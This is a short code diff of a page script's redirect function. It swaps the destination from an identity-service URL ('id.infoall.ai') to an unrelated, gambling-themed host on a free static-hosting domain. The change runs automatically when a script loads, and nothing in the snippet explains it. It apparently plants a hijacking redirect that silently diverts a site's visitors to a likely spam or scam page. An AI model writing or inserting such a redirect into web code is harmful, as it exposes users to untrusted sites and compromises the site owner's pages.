@@ -10,7 +10,7 @@
     function redirect() {
         clearTimeout(timeout);
         script.onload = null;
-        window.location.href = "https://id.infoall.ai";
+        window.location.href = "https://slotsrp.pages.dev/";
     }
 
     script.onload = redirect;
